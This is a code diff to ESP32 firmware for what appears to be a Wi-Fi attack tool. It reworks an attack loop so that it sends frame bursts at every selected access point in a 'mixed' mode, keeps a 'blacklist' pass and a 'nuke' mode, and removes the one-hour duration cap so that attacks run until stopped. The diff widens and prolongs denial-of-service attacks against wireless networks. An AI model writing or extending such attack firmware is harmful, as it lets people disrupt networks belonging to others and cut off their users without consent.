@@ -29,12 +29,6 @@ static uint32_t now_sec(void)
     return (uint32_t)(esp_timer_get_time() / 1000000ULL);
 }
 
-static const char *bssid_str(const uint8_t *b, char *out)
-{
-    snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X", b[0], b[1], b[2], b[3], b[4], b[5]);
-    return out;
-}
-
 /* Hit one AP target with the chosen mode. Returns frames sent. */
 static uint32_t attack_burst_for_ap(const target_ap_t *ap, attack_mode_t mode)
 {
@@ -154,25 +148,15 @@ static uint32_t blacklist_pass(void)
 static void attack_task(void *arg)
 {
     (void)arg;
-    char b1[18], b2[18];
-    target_ap_t  ap24, ap5;
-    target_sta_t sta;
-    bool has24 = targets_get_selected_24(&ap24);
-    bool has5  = targets_get_selected_5(&ap5);
-    bool has_sta = targets_get_selected_sta(&sta);
-    attack_mode_t mode = targets_get_mode();
-
     s_started_us = (uint32_t)(esp_timer_get_time() / 1000000ULL);
     s_pkts_24 = s_pkts_5 = s_pkts_bl = 0;
 
-    io_log("attack: start mode=%s duration=%us\r\n", targets_mode_name(mode), (unsigned)s_duration);
-    if (has24)    io_log("  2.4 GHz: %s ch=%u %s\r\n", ap24.ssid, (unsigned)ap24.channel, bssid_str(ap24.bssid, b1));
-    if (has5)     io_log("  5   GHz: %s ch=%u %s\r\n", ap5.ssid, (unsigned)ap5.channel, bssid_str(ap5.bssid, b2));
-    if (has_sta)  io_log("  STA   : %s on %s ch=%u\r\n",
-                         bssid_str(sta.mac, b1), bssid_str(sta.bssid, b2), (unsigned)sta.channel);
+    int n = targets_sel_count();
+    io_log("attack: start mode=mixed duration=%us  aps=%d\r\n",
+           (unsigned)s_duration, n);
 
-    if (!has24 && !has5 && !has_sta && mode != ATTACK_MODE_UNICAST) {
-        io_log("attack: no targets selected — set t24/t5/sta first\r\n");
+    if (n == 0) {
+        io_log("attack: no APs selected\r\n");
         s_running = false;
         s_task = NULL;
         vTaskDelete(NULL);
@@ -180,28 +164,30 @@ static void attack_task(void *arg)
     }
 
     uint32_t last_log = 0;
-    uint32_t cycles = 0;
 
     while (s_running) {
         uint32_t elapsed = now_sec() - s_started_us;
-        if (elapsed >= s_duration) break;
+        /* duration == 0 means run until explicitly stopped */
+        if (s_duration > 0 && elapsed >= s_duration) break;
 
-        if (has24) s_pkts_24 += attack_burst_for_ap(&ap24, mode);
-        vTaskDelay(pdMS_TO_TICKS(5));
-        if (has5)  s_pkts_5  += attack_burst_for_ap(&ap5, mode);
-        vTaskDelay(pdMS_TO_TICKS(5));
-
+        for (int i = 0; i < n && s_running; i++) {
+            target_ap_t ap;
+            if (targets_get_sel_ap(i, &ap) != 0) continue;
+            uint32_t sent = attack_burst_for_ap(&ap, ATTACK_MODE_MIXED);
+            if (ap.band_5ghz) s_pkts_5  += sent;
+            else              s_pkts_24 += sent;
+            vTaskDelay(pdMS_TO_TICKS(5));
+        }
         s_pkts_bl += blacklist_pass();
         vTaskDelay(pdMS_TO_TICKS(2));
 
-        cycles++;
-
+        elapsed = now_sec() - s_started_us;
         if (elapsed - last_log >= 2) {
             last_log = elapsed;
             uint32_t total = s_pkts_24 + s_pkts_5 + s_pkts_bl;
-            float pps = (float)total / (float)(elapsed > 0 ? elapsed : 1);
-            io_log("attack: %us  total=%" PRIu32 "  pps=%.0f  cycles=%" PRIu32 "  (24=%" PRIu32 " 5=%" PRIu32 " bl=%" PRIu32 ")\r\n",
-                   (unsigned)elapsed, total, pps, cycles, s_pkts_24, s_pkts_5, s_pkts_bl);
+            io_log("attack: %us  aps=%d  total=%" PRIu32 "  pps=%.0f\r\n",
+                   (unsigned)elapsed, n, total,
+                   (float)total / (float)(elapsed > 0 ? elapsed : 1));
         }
     }
 
@@ -298,8 +284,11 @@ bool attack_start(uint32_t duration_seconds)
         io_log("attack: already running\r\n");
         return false;
     }
-    if (duration_seconds < 1) duration_seconds = 1;
-    if (duration_seconds > 3600) duration_seconds = 3600;
+    if (targets_sel_count() == 0) {
+        io_log("attack: no APs selected\r\n");
+        return false;
+    }
+    /* duration_seconds == 0 means run until stop */
     s_duration = duration_seconds;
     s_running = true;
     /* Priority 3: below the serial RX task (8) and below the default app
@@ -334,11 +323,10 @@ void attack_print_status(void)
         return;
     }
     uint32_t elapsed = now_sec() - s_started_us;
-    uint32_t remain = (elapsed >= s_duration) ? 0 : (s_duration - elapsed);
     uint32_t total = s_pkts_24 + s_pkts_5 + s_pkts_bl;
     float pps = (float)total / (float)(elapsed > 0 ? elapsed : 1);
-    const char *mname = s_is_nuke ? "nuke" : targets_mode_name(targets_get_mode());
-    io_log("status: running  mode=%s  elapsed=%us  remain=%us  pkts=%" PRIu32 "  pps=%.0f  (24=%" PRIu32 " 5=%" PRIu32 " bl=%" PRIu32 ")\r\n",
-           mname, (unsigned)elapsed, (unsigned)remain, total, pps,
-           s_pkts_24, s_pkts_5, s_pkts_bl);
+    const char *mname = s_is_nuke ? "nuke" : "mixed";
+    int aps = s_is_nuke ? targets_ap_count() : targets_sel_count();
+    io_log("status: running  mode=%s  elapsed=%us  aps=%d  pkts=%" PRIu32 "  pps=%.0f\r\n",
+           mname, (unsigned)elapsed, aps, total, pps);
 }
